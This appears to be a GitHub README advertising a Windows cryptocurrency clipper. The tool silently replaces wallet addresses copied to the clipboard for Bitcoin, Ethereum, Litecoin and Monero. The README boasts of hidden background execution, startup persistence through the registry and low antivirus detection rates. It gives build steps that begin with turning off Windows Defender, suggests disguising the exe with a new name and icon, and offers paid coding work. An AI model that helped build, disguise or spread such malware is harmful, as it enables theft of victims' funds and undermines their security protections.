# Windows crypto clipper - USE MAIN.PYW AS EXE FOR STEALTH AS IT DOESNT HAVE TERMINAL (RUNS IN BACKGROUND HIDDEN)
**BTC, ETH, LTC, XMR clipper written in python using no external packages. ONLY WORKS ON WINDOWS**
---
**Features**
- Supports Bitcoin, Ethereum, Litecoin, Monero
- Has a single use option. (Will only ever clip once and then never again, kind of like a stealth mode)
- Works as .exe
- Duplicates and adds to startup with registry
- Uses powershell to read and set clipboard
- Has an uninstaller
- If single_use is True and a address has been copied the program will exit.
- If single_use is True and the computer restarts the registry (startup) entry will be removed
---
**Before .exe - [virustotal](https://www.virustotal.com/gui/file/ebac6103848d1089284ef9a258ec31e85218a79265bde04d96f22e1c19c6d953/summary) - 0/60 detections**
---
**As .exe - [virustotal](https://www.virustotal.com/gui/file/f54cc1163e9268176544ea8774a2b7b72e98f20483f331cadf5ed9646d13b688/summary) - 12/70 detections**
---
How to make into .exe
```console
# Turn of windows defender

# pip install pyinstaller

# pyinstaller --onefile main.pyw

# when .exe is ran it will duplicate, add to startup and monitor clipboard. You can rename and change icon of the exe. 

# if computer is turned on and off/restarted the program will run at startup as the task "clppth.exe".
```
---
**The .exe may need to be run with realtime protection off on antivirus**
---
**For manual uninstall**
- Windows key + r
- %appdata%
- Delete folder Storage0 and folder CLPPTH
- Goto registry editor
- Goto Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
- Delete entry CLPPTH
---
**Example of usage - sorry for low res video - github shitty 10mb max video upload**
https://github.com/3022-2/crypto-clipper/assets/82278708/9bfbd0a6-e0e6-41e1-84fa-50aa55f9d813
## **contact**
**I can be contacted at the following telegram for programming for pay: @johnnydoe0**
